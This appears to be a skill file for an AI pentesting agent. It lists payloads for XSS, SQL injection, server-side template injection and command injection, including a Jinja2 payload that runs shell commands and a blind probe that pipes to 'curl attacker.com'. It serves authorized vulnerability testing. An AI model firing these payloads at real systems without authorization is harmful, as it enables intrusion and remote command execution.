---
name: payload-research
description: Payload crafting and bypass research for vulnerability verification
tags: [pentest, payload, research]
---

# Payload Research Skill

## When to Use
Use this skill when you need to research, craft, or refine payloads for vulnerability verification.

## Focus Areas
- Input point analysis: where does user input enter the application?
- Filter/WAF identification: what gets blocked or sanitized?
- Encoding research: URL encoding, HTML entities, Unicode, double encoding
- Bypass techniques: alternative syntax, case variations, null bytes
- Signal identification: what observable behavior confirms the vulnerability?

## Payload Categories

### XSS Payloads
- Basic: `<script>alert(1)</script>`
- Event handlers: `<img onerror=alert(1) src=x>`
- SVG: `<svg onload=alert(1)>`
- Template injection: `{{constructor.constructor('alert(1)')()}}`

### SQLi Payloads
- Detection: `' OR '1'='1`, `1; SELECT 1--`
- Union: `' UNION SELECT null,null--`
- Time-based: `'; WAITFOR DELAY '0:0:5'--`

### SSTI Payloads
- Detection: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

### Command Injection
- Basic: `; id`, `| id`, `` `id` ``
- Blind: `; sleep 5`, `| curl attacker.com`

## Output Standards
- This skill produces payload candidates only — it does not issue final vulnerability verdicts. Record candidates as ideas/notes, not as confirmed findings.
- Stay on the hypothesis at hand: if you are researching payloads for one entry point / vuln class, keep all candidates scoped to it; don't branch into unrelated targets.
- Once a payload yields a stable, reproducible result, hand the verification verdict to the targeted-pentest flow rather than declaring success here.
- Provide ready-to-use payloads with prerequisites and expected success/failure signals.
- Optional markdown explanation is allowed, but machine ingestion only reads the submitted JSON payload.
